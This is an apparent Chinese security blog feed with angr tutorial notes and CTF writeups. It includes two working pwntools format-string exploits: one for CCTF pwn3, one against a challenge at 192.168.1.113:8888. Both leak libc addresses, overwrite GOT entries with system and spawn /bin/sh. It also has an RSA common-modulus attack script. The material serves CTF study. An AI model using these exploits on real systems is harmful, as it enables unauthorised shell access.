hundred &gt; 5                   //&lt;Bool True&gt;
hundred &gt; -5               //&lt;Bool False&gt;
</code></pre><p>上述有一个奇怪的地方，hundred值是正整数，与-5相比应该是True，可为什么返回的是False呢？因为默认情况下的是无符号类型的比较，那么-5就被强制转换为了<bv64 0xfffffffffffffffb="">,自然大于100.</bv64></p>
<p>那么在if 或者是while语句中则不能直接使用变量之间的比较，可能无法得到具体的真值。这里可以这样使用。</p>
<p>yes = one == 1                      //必然事件<br>no = one == 2                        //不可能事件<br>maybe = x == y                        //可能事件<br>state.solver.is_true(yes)           //Ture<br>state.solver.is_false(yes)          //False<br>state.solver.is_true(no)            //False<br>state.solver.is_false(no)           //True<br>state.solver.is_true(maybe)         //False<br>state.solver.is_false(maybe)        //False</p>
<h3 id="添加约束"><a href="#添加约束" class="headerlink" title="添加约束"></a>添加约束</h3><p>当我们对r100进行分析之后，我们也许可以判断出所要得到的值的一些信息，比如长度，字符的Ascii大小等。那么为了增加效率，减少错误尝试。便可以认为添加约束。举个例子：</p>
<pre><code>state.solver.add(x &gt; y)      //约束x&gt;y
state.solver.add(y &gt; 2)         //约束y&gt;2
state.solver.add(10 &gt; x)     //约束x&lt;10
state.solver.eval(x)         //求x满足条件的最小值为4
</code></pre><p>如果像Z3那样已知算法和输出结果求解输入值，就可写成如下格式：<br>    state = proj.factory.entry_state()               //创建对象得到入口点<br>    input = state.solver.BVS(‘input’, 64)             //定义一个符号<br>    operation = (((input + 4) * 3) &gt;&gt; 1) + input     //操作<br>    output = 200                                     //定义输出值<br>    state.solver.add(operation == output)            //添加约束，操作后值等于输出值<br>    state.solver.eval(input)                         //求解input</p>
<p>此解决方案只适用于比特向量，而非整数域。有的时候在使用时也会不小心添加有矛盾或者不合逻辑的约束，可以使用如下命令进行检测，以防报错：</p>
<pre><code>state.satisfiable()     //True/False
</code></pre><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><h4 id="FPV及FPS"><a href="#FPV及FPS" class="headerlink" title="FPV及FPS"></a>FPV及FPS</h4><p>与BVV/BVS类似，可以使用FPV（float point valuse）及FPS(float point symbols)创建。</p>
<pre><code>a = state.solver.FPV(3.2, state.solver.fp.FSORT_DOUBLE) //&lt;FP64 FPV(3.2, DOUBLE)&gt;
b = state.solver.FPS(&apos;b&apos;, state.solver.fp.FSORT_DOUBLE) //&lt;FP64 FPS(&apos;FP_b_0_64&apos;, DOUBLE)&gt;
a + b      //&lt;FP64 fpAdd(&apos;RNE&apos;, FPV(3.2, DOUBLE), FPS(&apos;FP_b_0_64&apos;, DOUBLE))&gt;
a + 4.4    //&lt;FP64 FPV(7.6000000000000005, DOUBLE)&gt;
b + 2 &lt; 0  //&lt;Bool fpLT(fpAdd(&apos;RNE&apos;, FPS(&apos;FP_b_0_64&apos;, DOUBLE), FPV(2.0, DOUBLE)), FPV(0.0, DOUBLE))&gt;
</code></pre><h4 id="raw-to-bv-与raw-to-fp"><a href="#raw-to-bv-与raw-to-fp" class="headerlink" title="raw_to_bv()与raw_to_fp()"></a>raw_to_bv()与raw_to_fp()</h4><p>BV与FP之间也是可以进行相互转换的，如下所示:</p>
<pre><code>a.raw_to_bv()                         //&lt;BV64 0x400999999999999a&gt;
b.raw_to_bv()                         //&lt;BV64 fpToIEEEBV(FPS(&apos;FP_b_0_64&apos;, DOUBLE))&gt;
state.solver.BVV(0, 64).raw_to_fp()   //&lt;FP64 FPV(0.0, DOUBLE)&gt;
state.solver.BVS(&apos;x&apos;, 64).raw_to_fp() //&lt;FP64 fpToFP(x_1_64, DOUBLE)&gt;
</code></pre><h4 id="val-to-bv-与val-to-fp"><a href="#val-to-bv-与val-to-fp" class="headerlink" title="val_to_bv()与val_to_fp()"></a>val_to_bv()与val_to_fp()</h4><p>第二中转换方法必须以目标值的大小或者种类作为参数：</p>
<pre><code>a                            //&lt;FP64 FPV(3.2, DOUBLE)&gt;
a.val_to_bv(12)                 //&lt;BV12 0x3&gt;
a.val_to_bv(12).val_to_fp(state.solver.fp.FSORT_FLOAT)  //&lt;FP32 FPV(3.0, FLOAT)&gt;
</code></pre><h3 id="运算求解"><a href="#运算求解" class="headerlink" title="运算求解"></a>运算求解</h3><p>前面我们已经提及了solve下的eval，使用这个进行求解。它还有其他求解模式如下：</p>
<ol>
<li>solver.eval(expression) 将给出一个给定表达式的可能解决方案。</li>
<li>solver.eval_one(expression) 将为您提供给定表达式的解决方案，或者如果可能有多个解决方案则抛出错误。</li>
<li>solver.eval_upto(expression, n) 将为您提供最多n个给定表达式的解决方案，如果可能少于n，则返回少于n个。</li>
<li>solver.eval_atleast(expression, n) 将给出给定表达式的n个解决方案，如果可能少于n则抛出错误。</li>
<li>solver.eval_exact(expression, n) 将为您提供给定表达式的n个解决方案，如果少于或多于可能，则抛出错误。</li>
<li>solver.min(expression) 将为您提供给定表达式的最小可能解决方案。</li>
<li>solver.max(expression) 将为您提供给定表达式的最大可能解决方案。</li>
</ol>
<p>在这些模式求解中，我们对结果可以进行规定，参数关键字如下两种：</p>
<ol>
<li>extra_constraints可以作为约束元组传递。此评估将考虑这些约束，但不会添加到状态。</li>
<li>ast_to可以传递数据类型以将结果转换。目前只能转换为str，这将导致该方法返回基础数据的字节表示。例如，state.solver.eval(state.solver.BVV(0x41424344, 32), cast_to=str)将返回”ABCD”。</li>
</ol>
<h2 id="Angr之程序状态"><a href="#Angr之程序状态" class="headerlink" title="Angr之程序状态"></a>Angr之程序状态</h2><p>在程序运作的过程中，内存以及寄存器的信息是很重要的，这里如果对程序加载过后，即可或得寄存器或是内存中的相关信息，并可以实现拷贝造作。</p>
<pre><code>state.regs.rbp = state.reps.rsp                                        //拷贝rsp到rbp
state.mem[0x1000].uint64_t = state.regs.rdx                            //储存rdx的信息到0x1000
state.regs.rbp = state.mem[state.regs.rbp].uint64_t.resolved        //清楚rbp
state.regs.rax += state.mem[state.regs.rsp + 8].uint64_t.resolved    //add rax, qword ptr [rsp + 8]
</code></pre><p>state.reg后面接寄存器名即可查询寄存器的信息或者是对数据进行操作;</p>
<p>state.mem用于从内存加载类型化数据，但是如果想在在内存范围内进行原始加载或者存储的话就比较麻烦。可以使用state.memory解决这个问题。</p>
<pre><code>s = proj.factory.blank_state()                     //创建一个空白状态
s.memory.store(0x4000, s.solver.BVV(0x1234, 64)) //存储数据到0x1234
s.memory.load(0x4004, 6) # load-size is in bytes //加载0x4004处的数据，返回&lt;BV48 0x89abcdef0123&gt;
</code></pre><p>前面所涉及的装载，factory意味工厂，里面后集中状态如下：</p>
<ol>
<li>.blank_state()构造一个“空白状态”，其大部分数据未初始化。访问未初始化的数据时，将返回无约束的符号值。</li>
<li>.entry_state() 构造一个准备在主二进制文件入口点执行的状态。</li>
<li>.full_init_state()构造一个准备通过任何需要在主二进制文件入口点之前运行的初始化程序执行的状态，例如，共享库构造函数或预初始化程序。完成这些后，它将跳转到入口点。</li>
<li>.call_state() 构造一个准备执行给定函数的状态。</li>
</ol>
<h2 id="Angr之Simulation-Manager"><a href="#Angr之Simulation-Manager" class="headerlink" title="Angr之Simulation_Manager"></a>Angr之Simulation_Manager</h2><p>Angr中最重要的就是Simulation_Manager，它允许同时控制状态组的符号执行，应用探索策略来探索程序的状态空间。</p>
<h3 id="步进"><a href="#步进" class="headerlink" title="步进"></a>步进</h3><p>和gdb或者od的动态调试类似，我们想要探索一个程序除了让他自动执行，我们也可以控制执行。通过一个基本块将给定存储中的所有状态向前步进。</p>
<pre><code>import angr
proj = angr.Project(&apos;examples/fauxware/fauxware&apos;, auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state)
simgr.active                        //&lt;SimState @ 0x400580&gt;

simgr.step()
simgr.active                        //[&lt;SimState @ 0x400540&gt;]
</code></pre><p>如果在符号执行过程中遇到了分支情况的话，两个后继状态都会出现在储存当中，并且可以同步两个状态。但是如果不太注重中间过程的分析的话。可以直接使用run进行操作：</p>
<pre><code>#使用step
while len(simgr.active) == 1:
   simgr.step()

simgr                //&lt;SimulationManager with 2 active&gt;
simgr.active        //[&lt;SimState @ 0x400692&gt;, &lt;SimState @ 0x400699&gt;]

#使用run
simgr.run()
simgr                //&lt;SimulationManager with 3 deadended&gt;
</code></pre><h3 id="Stash-Management"><a href="#Stash-Management" class="headerlink" title="Stash Management"></a>Stash Management</h3><p>理解为存储管理，为了使状态与存储空间间调配移动，可以使用move(),那么这里就要指定，从哪儿来，到哪儿去，要做什么。及from_stash，to_stash以及filter_func（可选，默认是将一切）。例如，移动输出中具有特定字符串的所有内容：</p>
<pre><code>simgr.move(from_stash=&apos;deadended&apos;, to_stash=&apos;authenticated&apos;, filter_func=lambda s: &apos;Welcome&apos; in s.posix.dumps(1))
simgr          //output:&lt;SimulationManager with 2 authenticated, 1 deadended&gt;
</code></pre><p>这里就是将带有Welcome字符的所有输出进行存储，新建的存储名为’authenticated’。得到的存储实际上是一个列表，可以通过迭代进行逐个访问。当然，如果在存储名前加上one_,那么将会返回存储空间中的第一个状态，如果加的是mp_,那么将会返回多个存储信息。</p>
<pre><code>for s in simgr.deadended + simgr.authenticated:
    print hex(s.addr)
//output:0x1000030
         0x1000078
         0x1000078

simgr.one_deadended    //output: &lt;SimState @ 0x1000030&gt;
simgr.mp_authenticated //output: MP([&lt;SimState @ 0x1000078&gt;, &lt;SimState @ 0x1000078&gt;])
</code></pre><p>除了deadended，还有其他的几种存储类型如下所示：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>active</td>
<td style="text-align:center">除非指定了备用存储，否则默认执行步进状态</td>
</tr>
<tr>
<td>deadended</td>
<td style="text-align:center">程序遇到错误停止，正常结束或者是指令指针无效等。状态转到退出的存储</td>
</tr>
<tr>
<td>pruned</td>
<td style="text-align:center">使用时LAZY_SOLVES，除非绝对必要，否则不会检查状态是否满足。当存在状态时发现状态不满LAZY_SOLVES时，遍历状态层次结构以识别其历史上最初变得不饱和的状态。</td>
</tr>
<tr>
<td>unconstrained</td>
<td style="text-align:center">标志为不受约束的状态，由用户数据或某些其他符号数据源控制的指令指针放置在此处</td>
</tr>
<tr>
<td>unsat</td>
<td style="text-align:center">标志为不可满足的状态，即具有矛盾的约束</td>
</tr>
</tbody>
</table>
<p>上述方法的利用可以在<a href="https://docs.angr.io/docs/examples.html#reverseme-modern-binary-exploitation---csci-4968" target="_blank" rel="external">这里这里这里</a>看到使用方式。</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>工欲善其事必先利其器，这里把Angr常用常见的方法都进行了学习总结，下面就要结合实例进行熟练了。</p>
]]></content>
      
        <categories>
            
            <category> binary </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Angr </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[gdb.attach跟exp]]></title>
      <url>/2018/05/30/gdb-attach%E8%B7%9Fexp/</url>
      <content type="html"><![CDATA[<p>好久不跟，每次图片都要生成链接，emmm………说到底还是懒。还是该坚持。<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学pwn之路上的一个必经之路就是debug，前几天看到一个格式化的题目，在安全课上有相关文章（<a href="https://www.anquanke.com/post/id/85785" target="_blank" rel="external">戳我</a>），对就是那个CCTF-PWN3，exp逻辑很简单，跟着bin看一下exp就能明白，但是始终EOF，无法成功getshell，还记得学长跟我们说过的：做pwn题关键就在于跟exp，了解是哪里利用不对。OK，那就学学如何attach。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先贴上自己做这题的exp,具体的利用逻辑可以到上面的那个文章里进行查看：</p>
<pre><code>#!/usr/bin/env python
from pwn import *

context.log_level = &apos;debug&apos;

elf = ELF(&apos;pwn3&apos;)
libc = ELF(&apos;libc.so.6&apos;)

pr = process(&apos;./pwn3&apos;) 
#gdb.attach(pr, &apos;b *0x804889B&apos;)

username = &quot;rxraclhm&quot;

pr.recvuntil(&quot;Name (ftp.hacker.server:Rainism):&quot;)
pr.sendline(username)

# 1 -&gt; get
# 2 -&gt; put
# 3 -&gt; dir
# other -&gt; exit

def put(pr, name, content):
    pr.recvuntil(&quot;ftp&gt;&quot;)
    pr.sendline(&apos;put&apos;) 
    pr.recvuntil(&quot;upload:&quot;)
    pr.sendline(name)
    pr.recvuntil(&quot;content:&quot;)
    pr.sendline(content)

def get(pr, name, num):
    pr.recvuntil(&quot;ftp&gt;&quot;)
    pr.sendline(&apos;get&apos;)
    pr.recvuntil(&apos;get:&apos;)
    pr.sendline(name)
    return pr.recvn(num)

def dir(pr):
    pr.recvuntil(&quot;ftp&gt;&quot;)
    pr.sendline(&apos;dir&apos;)

plt_puts = elf.symbols[&apos;puts&apos;]
print &apos;plt_puts= &apos; + hex(plt_puts)
got_puts = elf.got[&apos;puts&apos;]
print &apos;got_puts= &apos; + hex(got_puts)

# /bin/sh
pause()
put(pr, &apos;/sh&apos;, &apos;%8$s&apos; + p32(got_puts))

text = get(pr, &apos;/sh&apos;, 4)
puts_addr = u32(text)
print &apos;puts_addr= &apos; + hex(puts_addr)
system_addr = puts_addr - (libc.symbols[&apos;puts&apos;] - libc.symbols[&apos;system&apos;])
print &apos;system_addr= &apos; + hex(system_addr)

def foo(name, address, num):
    num = num &amp; 0xff
    if num == 0 : num == 0x100
    payload = &apos;%&apos; + str(num) + &apos;c%10$hhn&apos;
    payload = payload.ljust(12, &apos;A&apos;) 
    put(pr, name, payload + p32(address))
    get(pr, name, 0)

foo(&apos;n&apos;, got_puts, system_addr)
foo(&apos;i&apos;, got_puts+1, (system_addr&gt;&gt;8)+6)
foo(&apos;b&apos;, got_puts+2, system_addr&gt;&gt;16)
foo(&apos;/&apos;, got_puts+3, system_addr&gt;&gt;24)

#put(pr, &apos;/sh&apos;, &apos;%8$s&apos; + p32(got_puts))

text = get(pr, &apos;/sh&apos;, 4)
puts_addr = u32(text)
print &apos;puts_addr= &apos; + hex(puts_addr)
# system(&quot;/bin/sh&quot;)
dir(pr)
pr.interactive()
</code></pre><p>我们直接本地执行是无法getshell的<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf4ine2ij30ek070mxk.jpg" alt=""></p>
<p>那么到底什么地方出了问题呢，有了利用逻辑，可以根据自己的逻辑一个一个的排查：</p>
<ol>
<li>泄漏的system地址错误？</li>
</ol>
<p>这个题目第一步就是利用格式化字符串泄漏puts的真实地址然后根据libc的偏移计算出system的地址。那么会不会是libc出了错误呢？</p>
<p>attach是时候表示一下了,这里其实可以直接在exp里调用attach，这里为了看的清楚，手动attach。在泄露位置下断点，然后在gdb中attach相关pid启动调试<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf53q87lj30va05ajuq.jpg" alt=""></p>
<p>然后在gdb中需要在一个地方下断点使得程序进入相关位置进行观察，然后c到相关位置（这里需要在左边的DEBUG终端内触发一下才可以继续。）<br>然后在gdb中把puts地址打印出来，和泄漏的进行对比。嗯，这个可能排除。</p>
<p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf5fh3puj30d904kabc.jpg" alt=""></p>
<ol>
<li>覆写出了问题？<br>泄漏出来地址之后就是构思如何执行system(/bin/sh)<br>看到dir函数里有一个puts函数，我们进行利用格式化字符把puts的地址进行覆写，在执行puts(/bin/sh),就变成了system(/bin/sh)</li>
</ol>
<p>这里会不会是覆写出了问题呢？可以看一看。直接在puts的调用地方下断点。</p>
<p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frtf3b5r1zj30fe03fglp.jpg" alt=""> </p>
<p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf76cb21j307k020745.jpg" alt=""></p>
<p>直接c到相关位置:<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frtf7qr1gsj30hd06rdgd.jpg" alt=""></p>
<p>可以看出来，参数/bin/sh已经成功写入，那么与puts绑定的got有没有成功改写呢？继续跟。s进入puts</p>
<p>下图可以看出我们覆写的是没有问题的。额。。的确puts的got被我们改成了我们计算出来的system的地址了。</p>
<p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1frtf8usxsej30om04mgns.jpg" alt=""></p>
<ol>
<li>libc不匹配<br>那就奇怪了，为什么没有成功getshell呢？下图给你答案，libc不匹配，通过提供的libc的offset计算的system地址是不正确的。</li>
</ol>
<p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1frtf875w47j30fw0bpq79.jpg" alt=""></p>
<p>这里我们看到c3和c9相差了6，那么我们将覆写system地址对应位置加上6即可覆写成功，即（foo(‘i’, got_puts+1, (system_addr&gt;&gt;8)+6)）或者是去找到对应的libc直接跑exp即可getshell。</p>
<p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf97rcc5j30d905c0t1.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我曾请教过一个大佬，如何学习pwn，他给我的意见就是到XCTF社区把那些热门题目跟exp多熟悉即可。的确，用好资源,重在积累。</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> debug </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[校赛Reverse&Crypto writeup]]></title>
      <url>/2017/12/02/%E6%A0%A1%E8%B5%9BReverse-Crypto-writeup/</url>
      <content type="html"><![CDATA[<p>2017.12.2日举办的校赛圆满结束，整理一下我们小组出的逆向和密码学的writeup<br><a id="more"></a></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="简单的Re"><a href="#简单的Re" class="headerlink" title="简单的Re"></a>简单的Re</h3><p>这道真的很简单，我们直接IDA内一顿操作，找到关键地方，如下图所示：<br><img src="http://otc7tld02.bkt.clouddn.com/RE100.jpg" alt=""></p>
<p>正确flag与0x53异或一下得到的结果就是程序内的自带数据，不多做解释。</p>
<pre><code>a=[53,63,50,52,40,1,96,37,54,103,32,58,**,**,**,**,32,12,102,60,12,58,61,39,54,97,54,102,39,33,63,61,52,46]
flag=&apos;&apos;
for i in range(0,len(a)):
    flag+=chr(a[i]^0x53)
print(flag)
</code></pre><h3 id="来自计算机七号的挑（song）战（fen）"><a href="#来自计算机七号的挑（song）战（fen）" class="headerlink" title="来自计算机七号的挑（song）战（fen）"></a>来自计算机七号的挑（song）战（fen）</h3><p>很有深度的一道题目，IDA看一下<br><img src="http://ww1.sinaimg.cn/large/006jDttTly1fm3j8to5agj30i30g2aai.jpg" alt=""></p>
<p>大致逻辑可以看得很清楚，我们输入的flag和7异或后加上7存放于一个数组中，问题在于后面是和什么异或然后和内存数据进行比较的呢？</p>
<p>IDA看不到只能用OD跟踪了。</p>
<p><img src="http://ww1.sinaimg.cn/large/006jDttTly1fm3j3y7rm7j30eq0hy3za.jpg" alt=""></p>
<p>这里可以看到是和什么异或然后和239之类的数据进行比较的。所以说，我们可以修改跳转把所有的异或数据全部拿出来，最后15个数据为：jblg8DD3qFr04i4</p>
<p>OK，flag就是一个脚本的问题了。<br><img src="http://ww1.sinaimg.cn/large/006jDttTly1fm3kkhsfi7j30aa03ymx6.jpg" alt=""></p>
<h3 id="Android-B"><a href="#Android-B" class="headerlink" title="Android_B"></a>Android_B</h3><p>一道安卓题目，app就先下载下来玩玩嘛，安装完打开发现页面上有一个按钮，按不了.<br><img src="http://otc7tld02.bkt.clouddn.com/%E6%8C%89%E9%92%AE1.jpg" alt=""></p>
<p>题目描述按到就给flag，也不知道是不是骗人，那就试试呗，<br>程序猿肯定把butto的click功能给false了，那么我们只要找到smail文件的关键位置把false改成true就行了，剩下就是把猜想付诸于行动。<br><img src="http://otc7tld02.bkt.clouddn.com/button2.png" alt=""></p>
<p>OK改完了，那么我们重新编译然后再安装试试，发现真的给了一串乱码数据，管他呢，试试先，提交乱码的MD5值，Bingo，过了。<br><img src="http://otc7tld02.bkt.clouddn.com/button3.png" alt=""></p>
<h3 id="破解快乐"><a href="#破解快乐" class="headerlink" title="破解快乐"></a>破解快乐</h3><p>打开程序看一看</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/1.png" alt=""></p>
<p>java写的一个程序，用jd-gui打开源码看看。<br>主要的程序就是下面四个，其中第二个注意是一个提示的坑，不要踩进去，整理一下逻辑写个脚本结束。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/22.png" alt=""><br><img src="http://otc7tld02.bkt.clouddn.com/3.png" alt=""><br><img src="http://otc7tld02.bkt.clouddn.com/44.png" alt=""><br><img src="http://otc7tld02.bkt.clouddn.com/5.png" alt=""></p>
<p>第一幅图的拷贝函数很迷惑人， 看准跳转是关键！<br>贴下脚本：</p>
<pre><code>def diedai(n):
    if n &gt;2:
        return diedai(n-1)+diedai(n-2)
    else:
        return 1

def change(n,k):
    return diedai(n)%len(k)

if __name__ == &apos;__main__&apos;:
    str = &quot;vÈ¾¤ÊÊ¬ÆÆÊvÌ¤Ê²Ê²ÀÎ¤¨¸¬&quot;
    x = []
    for i in range(len(str)):
        x.append(chr((ord(str[i]) &gt;&gt; 1) + 15))
    key=&apos;&apos;.join(x)
    s=[]
    z1=0
    for z2 in range(0,4):
        for z3 in range(0,4):
            s.append(key[change(z1+z3,key)])
        z1+=5
    print(s)
</code></pre><h3 id="Android2"><a href="#Android2" class="headerlink" title="Android2"></a>Android2</h3><p>这题给了一个加密文件，一个apk，还是安装看看。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E5%8A%A0%E8%A7%A3%E5%AF%861.png" alt=""><br>发现里面有两个按钮，一个加密，一个解密，但是解密按完程序就蹦了，只有加密能出东西，而且他里面自己设置了一个类似密钥的东西，那就分析一下代码</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E5%8A%A0%E8%A7%A3%E5%AF%862.png" alt=""></p>
<p>关键代码是这一点，解密内没有代码，他的重要操作就是异或，异或可以，但是下面有图片验证，那么我们先把后缀改为图片后缀，然后再次加密，试试看嘛。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/Encryptor3.jpg" alt=""><br>OK,加密图片解出来了，大吉大利今晚吃鸡。图片上的base16解密即可。</p>
<h3 id="Maze"><a href="#Maze" class="headerlink" title="Maze"></a>Maze</h3><p>这个程序打不开。<br><img src="http://otc7tld02.bkt.clouddn.com/Mz1.jpg" alt=""></p>
<p>提示和数据打打交道，看看Hex</p>
<p>PE头应该在80H处，但是80H处是2333，所以把2333改成PE头就行<br><img src="http://otc7tld02.bkt.clouddn.com/Maze2.jpg" alt=""></p>
<p>OK程序可以打开<br><img src="http://otc7tld02.bkt.clouddn.com/MAZE3.jpg" alt=""><br>其实这个考察也不一定要解开，主要writeup在此：</p>
<p><a href="http://xq.dropsec.xyz/2017/08/10/XMAN%E6%8E%92%E4%BD%8D%E8%B5%9B-babymaze/">点我点我</a></p>
<h3 id="一起来“胖”啊"><a href="#一起来“胖”啊" class="headerlink" title="一起来“胖”啊"></a>一起来“胖”啊</h3><p>简单的格式化字符串漏洞，利用漏洞泄漏任意函数的真实地址，然后在lib中找到偏移地址算出system的真实地址，再次利用system，传入/bin/sh参数完成利用</p>
<p>exp：</p>
<pre><code>from pwn import *
\#context.log_level = &apos;debug&apos;
p = remote(&quot;192.168.1.113&quot;, 8888)
\#p=process(&quot;./pwne&quot;)
\# get printf libc addr
printf_got = 0x0804a010
leak_payload = &quot;bb%6$saa&quot; + p32(printf_got)
p.recvuntil(&quot;Hello, World\n&quot;)
p.sendline(leak_payload)
p.recvuntil(&quot;bb&quot;)
info = p.recvuntil(&quot;aa&quot;)[:-2]
print info.encode(&apos;hex&apos;)
\# get system libc addr
print_addr = u32(info[:4])
print &quot;print_addr:&quot;+hex(print_addr)
\#p_s_offset = 53479     # addr(printf) - addr(system)
printf_offset=0x4D280
system_offset=0x40190
system_addr = print_addr - printf_offset + system_offset
print &quot;systen_addr:&quot;+hex(system_addr)
\# get payload
payload = fmtstr_payload(4, {printf_got: system_addr})
\# send payload
p.recvuntil(&quot;Hello, World\n&quot;)
p.sendline(payload)
p.sendline(&apos;/bin/sh&apos;)

p.interactive()
</code></pre><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="密码学100"><a href="#密码学100" class="headerlink" title="密码学100"></a>密码学100</h3><p>很简单，凯撒加栅栏的加密，解密一下即可，注意大小写的存在：</p>
<p>先栅栏解密agvb{Tjp_1Mz_X1zQzm}</p>
<p>然后凯撒移位flag{You_1Re_C1eVer}</p>
<h3 id="贝斯家族"><a href="#贝斯家族" class="headerlink" title="贝斯家族"></a>贝斯家族</h3><p>根据描述可以知道，flag加密了36次base64，又加密一次base16<br>脚本：</p>
<pre><code>import base64

f=open(&quot;E:\Users\dd.txt&quot;,&apos;r&apos;)
flag = f.read()
flag = base64.b16decode(flag)
for i in range(36):
   flag=base64.b64decode(flag)

print(flag)
</code></pre><p>###RSA</p>
<ol>
<li>分析流量包提取有用信息：</li>
</ol>
<p><img src="http://otc7tld02.bkt.clouddn.com/rsa1.png" alt=""><br>看到有三个key的压缩包，压缩包可以通过foremost或者binwalk提取出来。</p>
<p>key1：<br>—–BEGIN PUBLIC KEY—–<br>MIGAMA0GCSqGSIb3DQEBAQUAA28AMGwCZQCnZIbrdaPobT4Ia+0c3yj+tR7l6prJ<br>byoeOrDRK5mXyasdn8HSExKeruRFMELsOupuF0Dw15zKzv8+9J+SQjE+7eZ/svRD<br>C6aPXQZGXKtcMiIqlHa4Q3hI6cw3WFgbYdIlC1OZAgMBAAE=<br>—–END PUBLIC KEY—–</p>
<p>key2：<br>—–BEGIN PUBLIC KEY—–<br>MIGAMA0GCSqGSIb3DQEBAQUAA28AMGwCZQCnZIbrdaPobT4Ia+0c3yj+tR7l6prJ<br>byoeOrDRK5mXyasdn8HSExKeruRFMELsOupuF0Dw15zKzv8+9J+SQjE+7eZ/svRD<br>C6aPXQZGXKtcMiIqlHa4Q3hI6cw3WFgbYdIlC1OZAgMBAAM=<br>—–END PUBLIC KEY—–</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/rsa2.png" alt=""></p>
<p>还有两个cry的txt需要扣取出来就好。</p>
<ol>
<li>分解两个公钥得到不同的两个不同的e和一个相同的n，会玩rsa的就可以知道是共膜攻击。</li>
<li><p>写代码，解题再转码转字符得到flag。<br>脚本：<br>#!/usr/bin/env python3<br># coding:utf-8<br>import binascii<br>def modinv(a, m):<br>  g, x, y = egcd(a, m)<br>  if g != 1:</p>
<pre><code>raise Exception(&apos;modular inverse does not exist&apos;)
</code></pre><p>  else:</p>
<pre><code>return x % m
</code></pre><p>def egcd(a,b):<br>  if a==0:</p>
<pre><code>return (b,0,1)
</code></pre><p>  else:</p>
<pre><code>g,y,x=egcd(b%a,a)
return (g,x-(b//a)*y,y)
</code></pre><p>def main():</p>
<p>#c1为密文1     c1=2030811156522080479534380585679540224811392358471221121903500951020792730252365410965194272526859671449231195224643995533159581726005071102332599685927429796174012361879498368574822467464773239467267683166997996469735733139730718951657093072<br>#c2为密文2    </p>
<p>c2=432349880784956087467730931619622010551468577048036338892145633949921703163476344960761289142596504797262111871151379630491409846619636163453069518097091623785238077044180062258181941690990234123420861146760076308983603961910238392785031770<br>#n为模</p>
<p>n=0xa76486eb75a3e86d3e086bed1cdf28feb51ee5ea9ac96f2a1e3ab0d12b9997c9ab1d9fc1d213129eaee4453042ec3aea6e1740f0d79ccaceff3ef49f9242313eede67fb2f4430ba68f5d06465cab5c32222a9476b8437848e9cc3758581b61d2250b5399</p>
<p>#egcd()两个参数分别为e1和e2<br>s = egcd(65537, 65539)<br>s1 = s[1]<br>s2 = s[2]<br>if s1&lt;0:<br>  s1 = - s1<br>  c1 = modinv(c1, n)<br>elif s2&lt;0:<br>  s2 = - s2<br>  c2 = modinv(c2, n)<br>m = (pow(c1,s1,n)*pow(c2,s2,n)) % n<br>h = hex(m)[2:-1]<br>print binascii.a2b_hex(h)<br>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>  main()</p>
</li>
</ol>
<p>4.得到flag：flag{deciphering_is_very_interesting}</p>
]]></content>
      
        <categories>
            
            <category> reverse </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[缓冲区溢出--栈溢出]]></title>
      <url>/2017/09/30/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      <content type="html"><![CDATA[<p>隔了好久不更，今儿就把搞懂的32位下和64位下的栈溢出漏洞分享一下咯，太菜，求大佬放过。<br><a id="more"></a></p>
<h2 id="Ⅰ-预热"><a href="#Ⅰ-预热" class="headerlink" title="Ⅰ.预热"></a>Ⅰ.预热</h2><p>搞懂栈溢出前提得把函数调用的时候栈内的变化和操作顺序，esp和ebp两个寄存器中指针的变化。这两个方面可参照前面这篇<a href="http://xq.dropsec.xyz/2017/07/04/%E5%A0%86%E6%A0%88%E5%8F%8A%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/">文章</a>。</p>
<h2 id="Ⅱ-原理"><a href="#Ⅱ-原理" class="headerlink" title="Ⅱ.原理"></a>Ⅱ.原理</h2><h3 id="①-简介"><a href="#①-简介" class="headerlink" title="①.简介"></a>①.简介</h3><p>栈溢出，顾名思义，就是把栈给搞炸，通过覆盖的方式把需要利用的地方进行修改，从而达到攻击的效果。</p>
